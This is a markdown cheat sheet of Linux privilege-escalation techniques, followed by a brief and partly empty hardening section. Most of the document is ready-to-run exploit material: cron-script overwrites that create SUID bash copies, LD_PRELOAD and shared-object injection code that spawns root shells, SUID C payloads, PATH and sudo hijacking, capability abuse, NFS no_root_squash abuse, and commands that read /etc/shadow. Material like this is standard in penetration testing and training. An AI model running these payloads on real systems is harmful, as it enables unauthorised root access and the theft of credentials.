# Linux-Privilege-Escalation

This document contains a list of privilege escalation techniques in Linux and how to harden the system to prevent them.

[Techniques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) 

## System Information

Gaining knowledge of system to exploit.

|Name|Command|Description|
|---|---|---|
|OS infor| (cat /proc/version \|\| uname -a ) 2>/dev/null <br> cat /etc/os-release 2>/dev/null |Finding version and searching for exploits|
|Path|echo $PATH|Find dir inside PATH that has write permission to hijack libraries or binaries|
|Environment|(env \|\| set) 2>/dev/null||
|Sudo version|sudo -V|sudo < v1.28 `sudo -u#-1 /bin/bash`|
|Dmesg signature verification failed|dmesg 2>/dev/null \| grep "signature"||
|Enumerate possible defenses|||

## Docker Breakout

## Usefull software

List usefull binaries
```python
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Check version of the installed packages and services
```python
dpkg -l #Debian
rpm -qa #Centos
```
## Scheduled//Cron jobs

Check all scheduled job
```python
cat /etc/crontab
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Check any cron with no path or writable.
```python
* * * * root check.sh
* * * * root /home/usr/backup.sh
```
**Exploit**
```python
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/usr/check.sh
echo 'cp /bin/bash /tmp/bash; chmod +x /tmp/bash' >> /home/usr/backup.sh
#wait crom job to be executed
/tmp/bash -p
```


### Invisible cron jobs
```python
#This is comment\r* * * * root check.sh
```

## Services

Check for writable .service files
```python
find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -perm /022 -type f -ls 2>/dev/null
```
## Timers

Check for writable .timer files
```python
find /etc/systemd/system /usr/lib/systemd/system -name "*.timer" -perm /022 -type f -ls 2>/dev/null
```
## Containerd (ctr) privilege escalation

## RunC privilege escalation

## D-Bus

## Users

## GTFOBins & GTFOArgs

[GTFOBins](https://gtfobins.github.io/)

[GTFOArgs](https://gtfoargs.github.io/)

## Sudo abuses

List user's privileges or check a specific

```python
sudo -l
```
### NOPASSWD

Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.

```python
$ sudo -l
User khoadan may run the following commands on test:
    (root) NOPASSWD: /usr/bin/vim
```
### SETEVN

This flag allows user to set environment variables when running the specified command.

```python
User khoadan may run the following commands on test:
    (ALL) SETENV: /opt/scripts/tasks.py
```
**Exploit**

PYTHONPATH is used by Python to determine which directories to look in for modules to import.

```python
sudo PYTHONPATH=/dev/mal/ /opt/scripts/tasks.py
```
Also use LD_PRELOAD variable

### Sudo command without path

_(already fixed because must be set /etc/sudoers with fully-qualified path name EX: ```test ALL=(ALL) NOPASSWD: /usr/bin/less```)_

When a single command such as ```ls```, ```cat``` have sudo permission. User can exploit it to get root by changing PATH.

```python
export PATH=/tmp:$PATH
#Creat script "ls" in /tmp
cp /bin/bash /tmp/ls
chmod +x /tmp/ls
sudo ls
```
### LD_PRELOAD

LD_PRELOAD is an optional Environment Variable that is used to set/load Shared Libraries to a program or script.

**Exploit**
- Permission to set LD_PRELOAD Environment Variables for a program.
- ```env_keep += LD_PRELOAD``` set in sudoers file

Create exploit.c
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
```python
gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so ls
```

### Reusing Sudo Tokens

(was fixed in ```sudo``` version 1.8.28)

**Requirements**
- /proc/sys/kernel/yama/ptrace_scope == 0
- Current user must have living process that has a valid sudo token with the same uid.
```python
git clone https://github.com/nongiach/sudo_inject
chmod +x exploit.sh
sudo -i
#<ctrl>+c
./exploit.sh
sudo -i
```

### Sudo Hijacking

```python
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc # malicious command
/usr/bin/sudo "$1" "${@:2}"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## SUID

SUID or GUID, when set, allows the process to execute under the specified user or group.

List all binary with suid/guid:
```python
find / -perm -4000 -ls 2>/dev/null
find / -perm -u=s -ls 2>/dev/null
find / -perm -2000 -ls 2>/dev/null
find / -perm -g=s -ls 2>/dev/null
```
[GTFOBins & GTFOArgs]()

Code: exploit.c
```C++
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
```C++
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(0, 0, 0);
    system("/bin/bash");
    return 0;
}
```

### SUID Binary – .so injection

Check all system calls made by a SUID (Set User ID) binary can provide insights into its behavior, particularly which files it attempts to access.

```python
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Example output
```python
open("/etc/ld.so.cache", O_RDONLY) = 3
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
access("/home/user/.config/libcalc.so", R_OK) = -1 ENOENT (No such file or directory)
```
Pay attention to non -existing files in writable directory to perform privileged escalation.

**Exploit**

Code: libcalc.c
```python
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
```python
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
./<SUID-BINARY>
```

### SUID binary without command path

Check suid binary with strings to see command execute.

```python
#-rwsr-sr-x    root    root    /home/check
strings /home/check
#service start nginx
```

**Exploit**
```python
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/home/check
```
### SUID binary with command path

Check suid binary with strings to see command execute.

```python
#-rwsr-sr-x    root    root    /home/check
strings /home/check
# /usr/sbin/service start nginx
```

**Exploit** 
(only work with old linux version)
```python
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/home/check
```
```python
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/home/check; set +x; /tmp/bash -p'
```

## Shared Object Hijacking

## Capabilities

File capabilities are a more fine-grained approach to granting specific privileges to executables than the traditional SUID (Set User ID) bit. The cap_setuid capability, for instance, allows a process to change its user ID, which is traditionally the function of SUID-root programs.

```python
getcap -r 2>/dev/null| grep cap_setuid
#/usr/bin/python2.6 = cap_setuid+ep
```

**Exploit**
```python
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## ACLs

## Interesting files

|File|Command|
|---|---|
|Profiles files|ls -l /etc/profile /etc/profile.d|
|Passwd/Shadow|cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null <br> cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null|
|Check Folders may contains interesting info|ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root 2>/dev/null|
|Writable root file|find / -type f -user root -perm -0002 -ls 2>/dev/null|grep -v '/proc/*'|
|Hidden file|find / -type f -iname ".*" -ls 2>/dev/null|

Shell files
```python
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

## NFS no_root_squash/no_all_squash misconfiguration PE

This is a misconfiguration in the NFS configuration. If the options no_root_squash or no_all_squash are found in ```/etc/exports```, then you can access it from a client and write inside that directory as if you were the local root of the machine.

```python
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Or use a **C SUID payloads** (see in [SUID]())

[NFS_privesc](https://www.errno.fr/nfs_privesc.html)

# Hardening (System configuration)
[Linux configuration](https://cyber.gouv.fr/en/publications/configuration-recommendations-gnulinux-system)
## Patririoning
## Account
## Access control
### Unix traditional model
1. Change default usmask for the shell to 0077.
```python
echo  'umask 0077' >> /etc/profile'
```
Change default usmask for services to 0027. Thit value can be defined directly in configuration file of the service **(UMask=0027)**.

[Understanding UMASK value](https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html)

2. Create a group and ony member in this group can run sudo
```python
chmod 760 /usr/bin/sudo
```
3. Sudo configuration guidelines (edit /etc/sudoers)

| Enable | Value |
| ------------- |-------------|
| noexec| applies the **NOEXEC** tag by defaulr on the command|
| requiretty| requires the user to have a tty login|
| use_pty | users a pseudo-tty when a command is executed|
| umask=0077 | forces umask to more restrictive mask |
| ignore_dot | ignores the "." in $PATH|
| env_reset | resets the env variables |

4. Restrict the normal user to run only limited set of commands
- Using restricted shell
```python
# create the restricted shell
cp /bin/bash /bin/rbash
# modify the target user
usermod -s /bin/rbash {username}
```
### AppArmor
### SELinux


## Files and directories 
### Sensitive files and directories
1. Limiting the rights
2. Changing the secrets and access rights as soon as possible
### Named ipc, sockets or pipes
### Access rights
1. Avoiding files or dir without a known user.
```python
find / \( -nouser -o nogroup \) -ls 2>/dev/null
```
2. Set **sticky bit**
3. Ignores setuid / setgid bits and exec right (especial root rights). 
```python
chmod 744 {filename}
chmod u-s {filename}
chmod g-s {filename}
```
